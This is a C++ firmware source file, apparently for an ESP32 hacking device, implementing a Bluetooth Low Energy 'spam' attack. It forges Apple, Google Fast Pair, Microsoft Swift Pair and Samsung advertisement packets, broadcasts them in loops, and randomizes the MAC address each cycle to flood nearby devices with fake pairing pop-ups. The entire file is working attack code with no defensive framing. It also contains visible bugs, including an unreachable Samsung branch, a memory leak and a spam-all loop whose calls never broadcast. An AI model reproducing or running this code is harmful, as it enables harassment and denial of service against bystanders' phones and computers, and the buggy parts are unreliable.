#include "ble_module.h"
#include <Arduino.h>
#include "core/globals.h"

const char* BLEModule::generateRandomName() {
  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = rand() % 10 + 1;
  char* randomName = (char*)malloc((len + 1) * sizeof(char)); 
  for (int i = 0; i < len; ++i) {
    randomName[i] = charset[rand() % strlen(charset)]; 
  }
  randomName[len] = '\0';
  return randomName;
}

void BLEModule::generateRandomMac(uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 255);
  }
  mac[0] = (mac[0] & 0xFC) | 0x02;
}

#ifdef HAS_BT
BLEData BLEModule::GetUniversalAdvertisementData(EBLEPayloadType Type) {
    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
    NimBLEAdvertisementData scannerData = NimBLEAdvertisementData();

    uint8_t* AdvData_Raw = nullptr;
    uint8_t i = 0;

    switch (Type) {
      case Microsoft: {

        LOG_MESSAGE_TO_SD(("Sending Microsoft Packet\n"));
        
        const char* Name = this->generateRandomName();

        uint8_t name_len = strlen(Name);

        AdvData_Raw = new uint8_t[7 + name_len];

        AdvData_Raw[i++] = 7 + name_len - 1;
        AdvData_Raw[i++] = 0xFF;
        AdvData_Raw[i++] = 0x06;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x03;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x80;
        memcpy(&AdvData_Raw[i], Name, name_len);
        i += name_len;

        AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
        break;
      }
      case Apple: {
        LOG_MESSAGE_TO_SD(("Sending Apple Packet\n"));
        AdvData_Raw = new uint8_t[17];

        AdvData_Raw[i++] = 17 - 1;    // Packet Length
        AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
        AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
        AdvData_Raw[i++] = 0x00;        // ...
        AdvData_Raw[i++] = 0x0F;  // Type
        AdvData_Raw[i++] = 0x05;                        // Length
        AdvData_Raw[i++] = 0xC1;                        // Action Flags
        const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
        AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
        esp_fill_random(&AdvData_Raw[i], 3); // Authentication Tag
        i += 3;   
        AdvData_Raw[i++] = 0x00;  // ???
        AdvData_Raw[i++] = 0x00;  // ???
        AdvData_Raw[i++] =  0x10;  // Type ???
        esp_fill_random(&AdvData_Raw[i], 3);

        AdvData.addData(std::string((char *)AdvData_Raw, 17));
        break;
      }
      case Samsung: {
        LOG_MESSAGE_TO_SD(("Sending Samsung Packet\n"));
        int randval = random(1, 2);

        if (randval == 1)
        {
          AdvData_Raw = new uint8_t[15];

          uint8_t model = watch_models[rand() % 25].value;
          
          AdvData_Raw[i++] = 14; // Size
          AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
          AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
          AdvData_Raw[i++] = 0x00; // ...
          AdvData_Raw[i++] = 0x01;
          AdvData_Raw[i++] = 0x00;
          AdvData_Raw[i++] = 0x02;
          AdvData_Raw[i++] = 0x00;
          AdvData_Raw[i++] = 0x01;
          AdvData_Raw[i++] = 0x01;
          AdvData_Raw[i++] = 0xFF;
          AdvData_Raw[i++] = 0x00;
          AdvData_Raw[i++] = 0x00;
          AdvData_Raw[i++] = 0x43;
          AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)

          AdvData.addData(std::string((char *)AdvData_Raw, 15));
        }
        else 
        {
          uint8_t advertisementPacket[] = {
            0x02, 0x01, 0x18, 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14,
            0x15, 0x03, 0x21, 0x01, 0x09, 0xEF, 0x0C, 0x01, 0x47, 0x06, 0x3C, 0x94, 0x8E,
            0x00, 0x00, 0x00, 0x00, 0xC7, 0x00
          };
          uint8_t scanResponsePacket[] = {
            0x10, 0xFF, 0x75, 0x00, 0x00, 0x63, 0x50, 0x8D, 0xB1, 0x17, 0x40, 0x46,
            0x64, 0x64, 0x00, 0x01, 0x04
          };

          fill_samsungbud_byte(advertisementPacket);

          AdvData.addData(std::string((char *)advertisementPacket, 31));
          scannerData.addData(std::string((char *)scanResponsePacket, 17));
        }

        

        break;
      }
      case Google: {
        LOG_MESSAGE_TO_SD(("Sending Google Packet\n"));
        AdvData_Raw = new uint8_t[14];
        AdvData_Raw[i++] = 3;
        AdvData_Raw[i++] = 0x03;
        AdvData_Raw[i++] = 0x2C; // Fast Pair ID
        AdvData_Raw[i++] = 0xFE;

        AdvData_Raw[i++] = 6;
        AdvData_Raw[i++] = 0x16;
        AdvData_Raw[i++] = 0x2C; // Fast Pair ID
        AdvData_Raw[i++] = 0xFE;
        AdvData_Raw[i++] = 0x00; // Smart Controller Model ID
        AdvData_Raw[i++] = 0xB7;
        AdvData_Raw[i++] = 0x27;

        AdvData_Raw[i++] = 2;
        AdvData_Raw[i++] = 0x0A;
        AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm

        AdvData.addData(std::string((char *)AdvData_Raw, 14));
        break;
      }
      default: {
        LOG_MESSAGE_TO_SD(("Please Provide a Company Type"));
        Serial.println("Please Provide a Company Type");
        break;
      }
    }

    delete[] AdvData_Raw;

    return {AdvData, scannerData};
}
#endif

void BLEModule::executeSpamAll()
{
#ifdef HAS_BT
    BLEInitilized = true;
    while (BLEInitilized)
    {
      executeSpam(EBLEPayloadType::Apple, false);
      delay(100);
      executeSpam(EBLEPayloadType::Google, false);
      delay(100);
      executeSpam(EBLEPayloadType::Microsoft, false);
      delay(100);
      executeSpam(EBLEPayloadType::Samsung, false);
    }
#endif
}

void BLEModule::executeSpam(EBLEPayloadType type, bool Loop) {
#ifdef HAS_BT
    BLEInitilized = Loop;
    while (BLEInitilized && Loop)
    {
      NimBLEDevice::init("");

      NimBLEServer *pServer = NimBLEDevice::createServer();

      pAdvertising = pServer->getAdvertising();

      BLEData advertisementData = this->GetUniversalAdvertisementData(type);
      pAdvertising->setAdvertisementData(advertisementData.AdvData);
      pAdvertising->setScanResponseData(advertisementData.ScanData);
      pAdvertising->start();
#ifdef NEOPIXEL_PIN
neopixelmodule->breatheLED(neopixelmodule->strip.Color(0, 0, 255), 300, false);
#endif
      delay(100);
      pAdvertising->stop();

      NimBLEDevice::deinit();

      uint8_t macAddr[6];
      generateRandomMac(macAddr);

      esp_base_mac_addr_set(macAddr);
#ifdef WROOM
      delay(1000); // Increase the delay due to weak CPU
#else
      delay(100);
#endif
    }
#endif
}
